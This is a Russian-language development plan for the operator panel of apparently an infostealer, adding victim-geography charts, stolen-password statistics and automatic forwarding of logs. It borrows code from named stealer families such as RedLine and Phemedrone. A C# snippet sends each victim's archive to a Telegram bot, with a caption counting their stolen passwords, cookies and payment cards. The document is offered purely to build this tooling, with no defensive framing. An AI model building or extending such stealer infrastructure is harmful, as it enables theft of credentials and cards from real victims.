# Phase 6.6–6.7: Charts, Maps & Telegram Proxy — План реализации

## Источники кода

| Компонент | Референс | Что берём |
|-----------|----------|-----------|
| **Country → emoji** | PhantomStealer `Flags.cs`, Stealerium `Flags.cs` | 250+ Unicode flag emoji |
| **Geo IP** | RedLine `GeoHelper.cs` | ip-api.com → страна, город, координаты |
| **Telegram send** | Phemedrone `Telegram.cs`, Phantom `Telegram.cs`, ferrox `telegram.rs` | Multipart upload к api.telegram.org |
| **Charts** | LiveCharts2 docs | Pie chart, timeline, heatmap |

## 6.6 Charts & Maps

### Country heatmap
- `/api/stats?geo=true` → JSON с `{country: count}` для всех сессий
- Dashboard отображает: флаг + название + количество сессий
- Цветовая шкала: от зелёного (1-5) до красного (50+)

### Browser pie chart
- `/api/stats?browsers=true` → JSON с `{browser: count}` из passwords
- LiveCharts2 `PieChart` в DashboardPage

### Sessions timeline
- `/api/stats?timeline=true` → JSON с `[{date, count}]` за 30 дней
- LiveCharts2 `LineSeries` в DashboardPage

### Top passwords
- `/api/stats?toppasswords=true` → JSON с `[{domain, count}]` top 10
- `ListView` в DashboardPage

## 6.7 Telegram Proxy

### Текущее состояние
`Services/TelegramProxy.cs` уже создан с `SendLog()` и `TestToken()`.
Нужно: подключить к PanelServer для авто-форварда логов.

### Интеграция
```csharp
// PanelServer.cs — после LogProcessor:
if (!string.IsNullOrEmpty(_settings.TelegramToken))
{
    var caption = $"New log from {session.Ip} ({session.CountryCode})\n" +
                  $"Passwords: {session.Passwords.Count}\n" +
                  $"Cookies: {session.Cookies.Count}\n" +
                  $"Cards: {session.Cards.Count}";
    _ = _telegram.SendLog(token, chatId, archive, fileName, caption);
}
```

## Файлы

| Файл | Действие |
|------|----------|
| `Views/DashboardPage.xaml` | UPDATE — добавить PieChart, timeline, топ паролей |
| `Views/DashboardPage.xaml.cs` | UPDATE — загружать статистику с /api/stats? расширениями |
| `Services/TelegramProxy.cs` | UPDATE — без изменений (уже готов) |
| `Services/PanelServer.cs` | UPDATE — добавить новые /api/stats endpoints + Telegram интеграция |
